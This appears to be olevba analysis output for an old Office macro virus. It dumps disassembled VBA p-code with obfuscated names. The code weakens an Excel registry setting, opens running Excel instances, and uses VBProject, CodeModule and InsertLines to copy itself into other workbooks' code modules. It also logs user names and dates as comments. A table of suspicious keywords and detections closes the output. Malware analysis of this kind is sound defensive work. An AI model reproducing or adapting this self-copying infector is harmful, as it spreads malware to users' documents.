' 	Add 
' 	St CBKQGW 
' Line #110:
' 	ElseBlock 
' Line #111:
' 	Ld OFAYBMKQUTmp 
' 	Ld QUBCASHQVGAUS 
' 	Ld JNRMNS 
' 	Ld YVIXS 
' 	ArgsLd Mid$ 0x0003 
' 	Concat 
' 	St OFAYBMKQUTmp 
' Line #112:
' 	EndIfBlock 
' Line #113:
' 	StartForVariable 
' 	Ld JNRMNS 
' 	EndForVariable 
' 	NextVar 
' Line #114:
' 	Ld PFUKLXCI 
' 	St JJUFCNQDGK 
' Line #115:
' 	StartForVariable 
' 	Ld JNRMNS 
' 	EndForVariable 
' 	Ld YVIXS 
' 	Ld XFAGVQDWHOWK 
' 	FnLen 
' 	For 
' Line #116:
' 	StartForVariable 
' 	Ld CBKQGW 
' 	EndForVariable 
' 	Ld YVIXS 
' 	Ld BNFFMRZQDUKZL 
' 	For 
' Line #117:
' 	Ld XFAGVQDWHOWK 
' 	Ld JNRMNS 
' 	Ld CBKQGW 
' 	ArgsLd OFAYBMKQU 0x0001 
' 	FnLen 
' 	ArgsLd Mid$ 0x0003 
' 	Ld CBKQGW 
' 	ArgsLd OFAYBMKQU 0x0001 
' 	Eq 
' 	IfBlock 
' Line #118:
' 	Ld XTVXIWR 
' 	Ld CBKQGW 
' 	ArgsLd OFAYBMKQU2 0x0001 
' 	Concat 
' 	St XTVXIWR 
' Line #119:
' 	Ld JNRMNS 
' 	Ld CBKQGW 
' 	ArgsLd OFAYBMKQU 0x0001 
' 	FnLen 
' 	Add 
' 	Ld YVIXS 
' 	Sub 
' 	St JNRMNS 
' Line #120:
' 	Ld GFNSCPWSLWFIVI 
' 	St JJUFCNQDGK 
' Line #121:
' 	ExitFor 
' Line #122:
' 	EndIfBlock 
' Line #123:
' 	StartForVariable 
' 	Ld CBKQGW 
' 	EndForVariable 
' 	NextVar 
' Line #124:
' 	Ld JJUFCNQDGK 
' 	Ld PFUKLXCI 
' 	Eq 
' 	IfBlock 
' Line #125:
' 	Ld XTVXIWR 
' 	Ld XFAGVQDWHOWK 
' 	Ld JNRMNS 
' 	Ld YVIXS 
' 	ArgsLd Mid$ 0x0003 
' 	Concat 
' 	St XTVXIWR 
' Line #126:
' 	ElseBlock 
' Line #127:
' 	Ld PFUKLXCI 
' 	St JJUFCNQDGK 
' Line #128:
' 	EndIfBlock 
' Line #129:
' 	StartForVariable 
' 	Ld JNRMNS 
' 	EndForVariable 
' 	NextVar 
' Line #130:
' 	Ld XTVXIWR 
' 	St XFAGVQDWHOWK 
' Line #131:
' 	EndSub 
' Line #132:
' 	FuncDefn (Private Sub RKCNGS(ByRef XFAGVQDWHOWK As String))
' Line #133:
' 	OnError (Resume Next) 
' Line #134:
' 	Dim (Const) 
' 	LitStr 0x0002 "' "
' 	VarDefn CTVSEIGJTDI
' 	LitDI2 0x0001 
' 	VarDefn YVIXS
' Line #135:
' 	Dim (Const) 
' 	LitStr 0x0011 "hh:mm:ss: AMPM - "
' 	VarDefn HXTMDEVREJQNGOD
' 	LitStr 0x0010 "dddd, d mmm yyyy"
' 	VarDefn JENPKIOAQRVUXEM
' Line #136:
' 	Dim 
' 	VarDefn TKXACEQEWKTmp
' 	VarDefn TKXACEQEWK
' 	VarDefn BSCSSNLMEA
' 	VarDefn BQNVZMMODB
' 	VarDefn TYEOXRHKCZXGU
' 	VarDefn RRONBZRHQUP (As String)
' Line #137:
' 	Dim 
' 	VarDefn JNRMNS (As Integer)
' Line #138:
' 	LitDI2 0x000A 
' 	Ld YVIXS 
' 	Mul 
' 	LitDI2 0x0003 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	St TYEOXRHKCZXGU 
' Line #139:
' 	Ld Application 
' 	MemLd UserAddress 
' 	St TKXACEQEWK 
' Line #140:
' 	Ld Time 
' 	Ld HXTMDEVREJQNGOD 
' 	ArgsLd Format$ 0x0002 
' 	Ld Date 
' 	Ld JENPKIOAQRVUXEM 
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	St BQNVZMMODB 
' Line #141:
' 	Ld YVIXS 
' 	LitDI2 0x000A 
' 	Mul 
' 	ArgsLd Chr 0x0001 
' 	St RRONBZRHQUP 
' Line #142:
' 	Ld Application 
' 	MemLd UserName 
' 	St BSCSSNLMEA 
' Line #143:
' 	StartForVariable 
' 	Ld JNRMNS 
' 	EndForVariable 
' 	Ld YVIXS 
' 	Ld TKXACEQEWK 
' 	FnLen 
' 	For 
' Line #144:
' 	Ld TKXACEQEWK 
' 	Ld JNRMNS 
' 	Ld YVIXS 
' 	ArgsLd Mid$ 0x0003 
' 	Ld TYEOXRHKCZXGU 
' 	Ne 
' 	IfBlock 
' Line #145:
' 	Ld TKXACEQEWK 
' 	Ld JNRMNS 
' 	Ld YVIXS 
' 	ArgsLd Mid$ 0x0003 
' 	Ld RRONBZRHQUP 
' 	Ne 
' 	IfBlock 
' Line #146:
' 	Ld TKXACEQEWKTmp 
' 	Ld TKXACEQEWK 
' 	Ld JNRMNS 
' 	Ld YVIXS 
' 	ArgsLd Mid$ 0x0003 
' 	Concat 
' 	St TKXACEQEWKTmp 
' Line #147:
' 	EndIfBlock 
' Line #148:
' 	ElseBlock 
' Line #149:
' 	Ld TKXACEQEWKTmp 
' 	Ld TYEOXRHKCZXGU 
' 	Concat 
' 	Ld CTVSEIGJTDI 
' 	Concat 
' 	St TKXACEQEWKTmp 
' Line #150:
' 	EndIfBlock 
' Line #151:
' 	StartForVariable 
' 	Ld JNRMNS 
' 	EndForVariable 
' 	NextVar 
' Line #152:
' 	Ld XFAGVQDWHOWK 
' 	Ld TYEOXRHKCZXGU 
' 	Concat 
' 	Ld CTVSEIGJTDI 
' 	Concat 
' 	Ld BQNVZMMODB 
' 	Concat 
' 	Ld TYEOXRHKCZXGU 
' 	Concat 
' 	Ld CTVSEIGJTDI 
' 	Concat 
' 	Ld BSCSSNLMEA 
' 	Concat 
' 	Ld TYEOXRHKCZXGU 
' 	Concat 
' 	Ld CTVSEIGJTDI 
' 	Concat 
' 	Ld TKXACEQEWK 
' 	Concat 
' 	Ld TYEOXRHKCZXGU 
' 	Concat 
' 	St XFAGVQDWHOWK 
' Line #153:
' 	EndSub 
' Line #154:
' 	FuncDefn (Private Sub FWXSYE(ByVal XFAGVQDWHOWK As String))
' Line #155:
' 	OnError (Resume Next) 
' Line #156:
' 	Dim 
' 	VarDefn XSBJJWF (As Long)
' Line #157:
' 	Dim 
' 	VarDefn IWRVWLXNQN (As Object)
' Line #158:
' 	Dim 
' 	VarDefn FRNLIBJWNMKHY
' 	VarDefn XDLVNVWH (As String)
' Line #159:
' 	LitStr 0x0045 "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel"
' 	St FRNLIBJWNMKHY 
' Line #160:
' 	LitHI2 0x0000 
' 	St XSBJJWF 
' Line #161:
' 	LitStr 0x0008 "Options6"
' 	St XDLVNVWH 
' Line #162:
' 	Ld XSBJJWF 
' 	LitStr 0x0000 ""
' 	Ld FRNLIBJWNMKHY 
' 	Ld XDLVNVWH 
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #163:
' 	SetStmt 
' 	ParamOmitted 
' 	LitStr 0x0011 "Excel.Application"
' 	ArgsLd GetObject 0x0002 
' 	Set IWRVWLXNQN 
' Line #164:
' 	Dim (Const) 
' 	LitDI2 0x0001 
' 	VarDefn YVIXS
' 	LitDI2 0x0000 
' 	VarDefn RZOCWYDF
' Line #165:
' 	Dim 
' 	VarDefn SFAFUUZLAPGUR (As String)
' Line #166:
' 	Dim 
' 	VarDefn JNRMNS
' 	VarDefn CBKQGW (As Integer)
' Line #167:
' 	LitStr 0x000C "ThisWorkbook"
' 	St SFAFUUZLAPGUR 
' Line #168:
' 	StartForVariable 
' 	Ld JNRMNS 
' 	EndForVariable 
' 	Ld YVIXS 
' 	Ld IWRVWLXNQN 
' 	MemLd Application 
' 	MemLd Workbooks 
' 	MemLd Count 
' 	For 
' Line #169:
' 	StartForVariable 
' 	Ld CBKQGW 
' 	EndForVariable 
' 	Ld YVIXS 
' 	Ld JNRMNS 
' 	Ld IWRVWLXNQN 
' 	MemLd Application 
' 	MemLd Workbooks 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #170:
' 	Ld CBKQGW 
' 	Ld JNRMNS 
' 	Ld IWRVWLXNQN 
' 	MemLd Application 
' 	MemLd Workbooks 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld RZOCWYDF 
' 	Eq 
' 	IfBlock 
' Line #171:
' 	Ld YVIXS 
' 	Ld XFAGVQDWHOWK 
' 	Ld CBKQGW 
' 	Ld JNRMNS 
' 	Ld IWRVWLXNQN 
' 	MemLd Application 
' 	MemLd Workbooks 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #172:
' 	Ld CBKQGW 
' 	Ld JNRMNS 
' 	Ld IWRVWLXNQN 
' 	MemLd Application 
' 	MemLd Workbooks 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	Ld SFAFUUZLAPGUR 
' 	Eq 
' 	IfBlock 
' Line #173:
' 	LitDI2 0x0021 
' 	Ld YVIXS 
' 	Mul 
' 	LitStr 0x0021 "Private Sub Workbook_Deactivate()"
' 	Ld CBKQGW 
' 	Ld JNRMNS 
' 	Ld IWRVWLXNQN 
' 	MemLd Application 
' 	MemLd Workbooks 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #174:
' 	ElseBlock 
' Line #175:
' 	Ld YVIXS 
' 	LitDI2 0x0021 
' 	Mul 
' 	LitStr 0x0022 "Private Sub Worksheet_Deactivate()"
' 	Ld CBKQGW 
' 	Ld JNRMNS 
' 	Ld IWRVWLXNQN 
' 	MemLd Application 
' 	MemLd Workbooks 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #176:
' 	EndIfBlock 
' Line #177:
' 	EndIfBlock 
' Line #178:
' 	StartForVariable 
' 	Ld CBKQGW 
' 	EndForVariable 
' 	NextVar 
' Line #179:
' 	StartForVariable 
' 	Ld JNRMNS 
' 	EndForVariable 
' 	NextVar 
' Line #180:
' 	SetStmt 
' 	LitNothing 
' 	Set IWRVWLXNQN 
' Line #181:
' 	EndSub 
' Line #182:
' 	QuoteRem 0x0000 0x0000 ""
' Line #183:
' 	QuoteRem 0x0000 0x0000 ""
' Line #184:
' 	QuoteRem 0x0000 0x0000 ""
' Line #185:
' 	QuoteRem 0x0000 0x0000 ""
' Line #186:
' 	QuoteRem 0x0000 0x0000 ""
' Line #187:
' 	QuoteRem 0x0000 0x0000 ""
' Line #188:
' 	QuoteRem 0x0000 0x0000 ""
' Line #189:
' 	QuoteRem 0x0000 0x0000 ""
' Line #190:
' 	QuoteRem 0x0000 0x0000 ""
' Line #191:
' 	QuoteRem 0x0000 0x0000 ""
' Line #192:
' 	QuoteRem 0x0000 0x0000 ""
' Line #193:
' 	QuoteRem 0x0000 0x0000 ""
' Line #194:
' 	QuoteRem 0x0000 0x0000 ""
' Line #195:
' 	QuoteRem 0x0000 0x0000 ""
' Line #196:
' 	QuoteRem 0x0000 0x0000 ""
' Line #197:
' 	QuoteRem 0x0000 0x0000 ""
' Line #198:
' 	QuoteRem 0x0000 0x0000 ""
' Line #199:
' 	QuoteRem 0x0000 0x0000 ""
' Line #200:
' 	QuoteRem 0x0000 0x0000 ""
' Line #201:
' 	QuoteRem 0x0000 0x0000 ""
' Line #202:
' 	QuoteRem 0x0000 0x0000 ""
' Line #203:
' 	QuoteRem 0x0000 0x0000 ""
' Line #204:
' Line #205:
' 	QuoteRem 0x0000 0x0024 " 05:50:07:  - tiistai, 23 helmi 1999"
' Line #206:
' 	QuoteRem 0x0000 0x001A " Taloustieteellinen osasto"
' Line #207:
' 	QuoteRem 0x0000 0x0000 ""
' Line #208:
' Line #209:
' 	QuoteRem 0x0000 0x0026 " 08:31:13:  - maanantai, 1 maalis 1999"
' Line #210:
' 	QuoteRem 0x0000 0x001A " Taloustieteellinen osasto"
' Line #211:
' 	QuoteRem 0x0000 0x0000 ""
' Line #212:
' Line #213:
' 	QuoteRem 0x0000 0x0028 " 04:45:45:  - keskiviikko, 3 maalis 1999"
' Line #214:
' 	QuoteRem 0x0000 0x0008 " Pohjola"
' Line #215:
' 	QuoteRem 0x0000 0x0000 ""
' Line #216:
' Line #217:
' 	QuoteRem 0x0000 0x0024 " 04:22:45:  - tiistai, 27 huhti 1999"
' Line #218:
' 	QuoteRem 0x0000 0x0003 " DF"
' Line #219:
' 	QuoteRem 0x0000 0x0000 ""
' Line #220:
' Line #221:
' 	QuoteRem 0x0000 0x0027 " 09:37:21:  - miðvikudagur, 28 apr 1999"
' Line #222:
' 	QuoteRem 0x0000 0x001D " Vesselin Vladimirov Bontchev"
' Line #223:
' 	QuoteRem 0x0000 0x0000 ""
' Line #224:
' Line #225:
' 	QuoteRem 0x0000 0x0027 " 10:04:46:  - miðvikudagur, 28 apr 1999"
' Line #226:
' 	QuoteRem 0x0000 0x001D " Vesselin Vladimirov Bontchev"
' Line #227:
' 	QuoteRem 0x0000 0x0000 ""
' Line #228:
' Line #229:
' 	QuoteRem 0x0000 0x0024 " 03:03:45: PM - Tuesday, 10 Oct 2000"
' Line #230:
' 	QuoteRem 0x0000 0x0009 " Harry H."
' Line #231:
' 	QuoteRem 0x0000 0x0000 ""
' Line #232:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

